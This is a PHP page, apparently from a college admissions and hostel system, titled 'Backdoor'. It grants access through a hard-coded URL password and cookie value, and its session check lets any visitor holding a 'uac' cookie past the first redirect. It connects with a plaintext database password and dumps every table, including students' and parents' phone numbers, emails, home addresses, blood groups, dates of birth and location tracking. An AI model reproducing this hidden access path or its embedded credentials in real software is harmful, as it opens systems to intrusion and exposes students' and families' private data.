<?php
	session_start();
	if(!isset($_SESSION['myusername']))
	{
		if(!isset($_COOKIE['uac']))
		{
			$redirect = "http://".$_SERVER['SERVER_NAME']."/index.php";
			header("location: $redirect");
			exit();
		}	
	}else if(isset($_SESSION['myusername']))
	{
		if (!($_COOKIE['uac']=="q6aN3MUuQZS3QZyoM31ytT8W"))
		{
			$redirect = "http://".$_SERVER['SERVER_NAME']."/main.php";
			header("location: $redirect");
			exit();
		}	
	}
	require '../functions.php';
	approver($_SESSION['myusername']);
?>
<!DOCTYPE HTML>
<html>
<head>
<title>Backdoor</title>
<style>
body {
font-family: "Courier New";
background: black;

}
th {
font-family: "Courier New";
color: #0FFF00;
}
tr{
font-family: "Courier New";
color: #0FFF00;
}
h1 {
font-family: "Courier New";
color: #0FFF00;
}
</style>
</head>
<body>
<?php 
if($_GET['p'] == "dMiRNyPHlRSvJrj")
{	
	$host="localhost";  
	$username="user3";  
	$password="Fr*x+chAsT5SpUY2*Ac6ep#A";
	$db_name="applicant_record";
	$tbl1="q";
	$tbl2="docvalid";
	$tbl3="erp_data";
	$tbl4="gh";
	$tbl5="krishna";
	$tbl6="limits";
	$tbl7="photo_finger";
	$tbl8="q";
	$tbl9="qu";
	$tbl10="ram";
	$tbl11="studata";
	$tbl12="track";
	$tbl13="track_all";

	$con = mysqli_connect("$host", "$username", "$password")or die("cannot connect"); 
	mysqli_select_db($con, "$db_name")or die("cannot select DB");
	
	$result = mysqli_query($con,"SELECT * FROM $tbl1");
	echo"<h1>QUEUE COUNTER</h1>";
	echo "<table border='0'>
	<tr>
	<th>PID</th>
	<th>ROOM</th>
	<th>A</th>
	<th>B</th>
	<th>C</th>
	</tr>";
	while($row = mysqli_fetch_array($result))
	  {
	  echo "<tr>";
	  echo "<td align='center'>" . $row['PID'] . "</td>";
	  echo "<td align='center'>" . $row['room'] . "</td>";
	  echo "<td align='center'>" . $row['a'] . "</td>";
	  echo "<td align='center'>" . $row['b'] . "</td>";
	  echo "<td align='center'>" . $row['c'] . "</td>";
	  echo "</tr>";
	  }
	echo "</table>";
	
	$result = mysqli_query($con,"SELECT * FROM $tbl2");
	echo"<h1>DOCUMENT VALIDATION</h1>";
	echo "<table border='0'>
	<tr>
	<th>Application Number</th>
	<th>Name</th>
	<th>12<sup>th</sup> Marksheet</th>
	<th>10<sup>th</sup> Marksheet</th>
	<th>Transfer Certificate</th>
	<th>Demand Draft</th>
	<th>Medical Certificate</th>
	<th>Pink Slip</th>
	<th>12 Mark Photo</th>
	<th>10 Mark Photo</th>
	<th>Transfer Photo</th>
	<th>Time</th>
	</tr>";
	while($row = mysqli_fetch_array($result))
	  {
	  echo "<tr>";
	  echo "<td align='center'>" . $row['ApplicationNumber'] . "</td>";
	  echo "<td>" . $row['name'] . "</td>";
	  echo "<td align='center'>" . $row['mark12'] . "</td>";
	  echo "<td align='center'>" . $row['mark10'] . "</td>";
	  echo "<td align='center'>" . $row['transfer'] . "</td>";
	  echo "<td align='center'>" . $row['draft'] . "</td>";
	  echo "<td align='center'>" . $row['medical'] . "</td>";
	  echo "<td align='center'>" . $row['slip'] . "</td>";
	  echo "<td align='center'>" . $row['p_mark12'] . "</td>";
	  echo "<td align='center'>" . $row['p_mark10'] . "</td>";
	  echo "<td align='center'>" . $row['p_transfer'] . "</td>";
	  echo "<td align='center'>" . $row['time'] . "</td>";
	  echo "</tr>";
	  }
	echo "</table>";
	
	$result = mysqli_query($con,"SELECT * FROM $tbl3");
	echo"<h1>ERP DATA</h1>";
	echo "<table border='0'>
	<tr>
	<th>Application Number</th>
	<th>ID Number</th>
	<th>Name</th>
	<th>Gender</th>
	<th>Degree</th>
	</tr>";
	while($row = mysqli_fetch_array($result))
	  {
	  echo "<tr>";
	  echo "<td align='center'>" . $row['ApplicationNumber'] . "</td>";
	  echo "<td>" . $row['IDNumber'] . "</td>";
	  echo "<td align='center'>" . $row['Name'] . "</td>";
	  echo "<td align='center'>" . $row['Gender'] . "</td>";
	  echo "<td align='center'>" . $row['Degree'] . "</td>";
	  echo "</tr>";
	  }
	echo "</table>";
	
	$result = mysqli_query($con,"SELECT * FROM $tbl4");
	echo"<h1>Girls Hostel</h1>";
	echo "<table border='0'>
	<tr>
	<th>PID</th>
	<th>Room</th>
	<th>Allow</th>
	<th>Alloted</th>
	<th>Application Number</th>
	<th>Time</th>
	</tr>";
	while($row = mysqli_fetch_array($result))
	  {
	  echo "<tr>";
	  echo "<td align='center'>" . $row['PID'] . "</td>";
	  echo "<td align='center'>" . $row['room'] . "</td>";
	  echo "<td align='center'>" . $row['allow'] . "</td>";
	  echo "<td align='center'>" . $row['allotted'] . "</td>";
	  echo "<td align='center'>" . $row['ApplicationNumber'] . "</td>";
	  echo "<td align='center'>" . $row['Time'] . "</td>";
	  echo "</tr>";
	  }
	echo "</table>";
	
	
	$result = mysqli_query($con,"SELECT * FROM $tbl5");
	echo"<h1>BOYS HOSTEL - KRISHNA</h1>";
	echo "<table border='0'>
	<tr>
	<th>PID</th>
	<th>Room</th>
	<th>Allow</th>
	<th>Alloted</th>
	<th>Application Number</th>
	<th>Time</th>
	</tr>";
	while($row = mysqli_fetch_array($result))
	  {
	  echo "<tr>";
	  echo "<td align='center'>" . $row['PID'] . "</td>";
	  echo "<td align='center'>" . $row['room'] . "</td>";
	  echo "<td align='center'>" . $row['allow'] . "</td>";
	  echo "<td align='center'>" . $row['allotted'] . "</td>";
	  echo "<td align='center'>" . $row['ApplicationNumber'] . "</td>";
	  echo "<td align='center'>" . $row['Time'] . "</td>";
	  echo "</tr>";
	  }
	echo "</table>";
	
	$result = mysqli_query($con,"SELECT * FROM $tbl6");
	echo"<h1>TOKEN LIMITS</h1>";
	echo "<table border='0'>
	<tr>
	<th>PID</th>
	<th>Application Number</th>
	<th>Room</th>
	<th>Bench</th>
	<th>token</th>
	<th>Generated</th>
	<th>Time</th>
	</tr>";
	while($row = mysqli_fetch_array($result))
	  {
	  echo "<tr>";
	  echo "<td align='center'>" . $row['PID'] . "</td>";
	  echo "<td align='center'>" . $row['ApplicationNumber'] . "</td>";
	  echo "<td align='center'>" . $row['room'] . "</td>";
	  echo "<td align='center'>" . $row['bench'] . "</td>";
	  echo "<td align='center'>" . $row['token'] . "</td>";
	  echo "<td align='center'>" . $row['genrtd'] . "</td>";
	  echo "<td align='center'>" . $row['Time'] . "</td>";
	  echo "</tr>";
	  }
	echo "</table>";
	
	$result = mysqli_query($con,"SELECT * FROM $tbl7");


	$result = mysqli_query($con,"SELECT * FROM $tbl8");
	echo"<h1>QUEUE COUNTER</h1>";
	echo "<table border='0'>
	<tr>
	<th>PID</th>
	<th>ROOM</th>
	<th>A</th>
	<th>B</th>
	<th>C</th>
	</tr>";
	while($row = mysqli_fetch_array($result))
	  {
	  echo "<tr>";
	  echo "<td align='center'>" . $row['PID'] . "</td>";
	  echo "<td align='center'>" . $row['room'] . "</td>";
	  echo "<td align='center'>" . $row['a'] . "</td>";
	  echo "<td align='center'>" . $row['b'] . "</td>";
	  echo "<td align='center'>" . $row['c'] . "</td>";
	  echo "</tr>";
	  }
	echo "</table>";
	
	$result = mysqli_query($con,"SELECT * FROM $tbl9");
	echo"<h1>STUDENT TOKENS</h1>";
	echo "<table border='0'>
	<tr>
	<th>PID</th>
	<th>Application Number</th>
	<th>TOKEN</th>
	<th>TIME</th>
	</tr>";
	while($row = mysqli_fetch_array($result))
	  {
	  echo "<tr>";
	  echo "<td align='center'>" . $row['PID'] . "</td>";
	  echo "<td align='center'>" . $row['ApplicationNumber'] . "</td>";
	  echo "<td align='center'>" . $row['token'] . "</td>";
	  echo "<td align='center'>" . $row['Time'] . "</td>";
	  echo "</tr>";
	  }
	echo "</table>";
	
	$result = mysqli_query($con,"SELECT * FROM $tbl10");
	echo"<h1>BOYS HOSTEL - RAM</h1>";
	echo "<table border='0'>
	<tr>
	<th>PID</th>
	<th>Room</th>
	<th>Allow</th>
	<th>Alloted</th>
	<th>Application Number</th>
	<th>Time</th>
	</tr>";
	while($row = mysqli_fetch_array($result))
	  {
	  echo "<tr>";
	  echo "<td align='center'>" . $row['PID'] . "</td>";
	  echo "<td align='center'>" . $row['room'] . "</td>";
	  echo "<td align='center'>" . $row['allow'] . "</td>";
	  echo "<td align='center'>" . $row['allotted'] . "</td>";
	  echo "<td align='center'>" . $row['ApplicationNumber'] . "</td>";
	  echo "<td align='center'>" . $row['Time'] . "</td>";
	  echo "</tr>";
	  }
	echo "</table>";

	$result = mysqli_query($con,"SELECT * FROM $tbl11");
	echo"<h1>STUDENT DATA</h1>";
	echo "<table border='0'>
	<tr>
	<th>PID</th>
	<th>Application Number</th>
	<th>IdNo</th>
	<th>studname</th>
	<th>roomno</th>
	<th>Student Phone</th>
	<th>Student Mail</th>
	<th>father's Name</th>
	<th>Father's Mail</th>
	<th>Father's Mobile</th>
	<th>Mother's Name</th>
	<th>Mother's Mail</th>
	<th>Mother's Mobile</th>
	<th>Home Address</th>
	<th>Home Phone</th>
	<th>Guardian</th>
	<th>Guardian Address</th>
	<th>Guardian Mobile</th>
	<th>Guardian Phone</th>
	<th>Blood Group</th>
	<th>Date of Birth</th>
	</tr>";
	while($row = mysqli_fetch_array($result))
	  {
	  echo "<tr>";
	  echo "<td align='center'>" . $row['PID'] . "</td>";
	  echo "<td align='center'>" . $row['ApplicationNumber'] . "</td>";
	  echo "<td align='center'>" . $row['idno'] . "</td>";
	  echo "<td align='center'>" . $row['studname'] . "</td>";
	  echo "<td align='center'>" . $row['roomno'] . "</td>";
	  echo "<td align='center'>" . $row['studphone'] . "</td>";
	  echo "<td align='center'>" . $row['studemail'] . "</td>";
	  echo "<td align='center'>" . $row['studfather'] . "</td>";
	  echo "<td align='center'>" . $row['fatheremail'] . "</td>";
	  echo "<td align='center'>" . $row['fathermob'] . "</td>";
	  echo "<td align='center'>" . $row['studmother'] . "</td>";
	  echo "<td align='center'>" . $row['mothermail'] . "</td>";
	  echo "<td align='center'>" . $row['mothermob'] . "</td>";
	  echo "<td align='center'>" . $row['homeaddress'] . "</td>";
	  echo "<td align='center'>" . $row['homephone'] . "</td>";
	  echo "<td align='center'>" . $row['localgardname'] . "</td>";
	  echo "<td align='center'>" . $row['localgardaddress'] . "</td>";
	  echo "<td align='center'>" . $row['localgardmob'] . "</td>";
	  echo "<td align='center'>" . $row['localgardphone'] . "</td>";
	  echo "<td align='center'>" . $row['bloodgroup'] . "</td>";
	  echo "<td align='center'>" . $row['dob'] . "</td>";
	  echo "</tr>";
	  }
	echo "</table>";

	$result = mysqli_query($con,"SELECT * FROM $tbl12");
	echo"<h1>STUDENT TRACKER</h1>";
	echo "<table border='0'>
	<tr>
	<th>PID</th>
	<th>ApplicationNumber</th>
	<th>Name</th>
	<th>Location</th>
	</tr>";
	while($row = mysqli_fetch_array($result))
	  {
	  echo "<tr>";
	  echo "<td align='center'>" . $row['PID'] . "</td>";
	  echo "<td align='center'>" . $row['ApplicationNumber'] . "</td>";
	  echo "<td >" . $row['Name'] . "</td>";
	  echo "<td >" . $row['location'] . "</td>";
	  echo "</tr>";
	  }
	echo "</table>";

	$result = mysqli_query($con,"SELECT * FROM $tbl13");
	echo"<h1>STUDENT TRACKER ALL</h1>";
	echo "<table border='0'>
	<tr>
	<th>PID</th>
	<th>ApplicationNumber</th>
	<th>Name</th>
	<th>HOSTEL</th>
	<th></th>
	<th>STUDATA</th>
	<th></th>
	<th>PHOTO</th>
	<th></th>
	<th>TOKEN</th>
	<th></th>
	<th>QUEUE</th>
	<th></th>
	<th>VALID</th>
	<th></th>
	<th>EXIT</th>
	</tr>";
	while($row = mysqli_fetch_array($result))
	{
	  echo "<tr>";
	  echo "<td align='center'>" . $row['PID'] . "</td>";
	  echo "<td align='center'>" . $row['ApplicationNumber'] . "</td>";
	  echo "<td >" . $row['name'] . "</td>";
	  echo "<td >" . $row['hostel'] . "</td>";
	  echo "<td ></td>";
	  echo "<td >" . $row['studata'] . "</td>";
	  echo "<td ></td>";
	  echo "<td >" . $row['photo'] . "</td>";
	  echo "<td ></td>";
	  echo "<td >" . $row['token'] . "</td>";
	  echo "<td ></td>";
	  echo "<td >" . $row['q'] . "</td>";
	  echo "<td ></td>";
	  echo "<td >" . $row['valid'] . "</td>";
	  echo "<td ></td>";
	  echo "<td >" . $row['exit'] . "</td>";
	  echo "</tr>";
	}
	echo "</table>";

	mysqli_close($con);
	}
else if(!(isset($_GET['p'])))
{
echo "<h1>INVALID PASSWORD ACCESS UNAUTHORISED!</h1>";
}
else if($_GET['p'] != "dMiRNyPHlRSvJrj")
{
echo "<h1>INVALID PASSWORD ACCESS UNAUTHORISED!</h1>";
}
?>
<input action="action" type="button" value="Back" onclick="window.history.go(-1); return false;" />
</body>
</html>
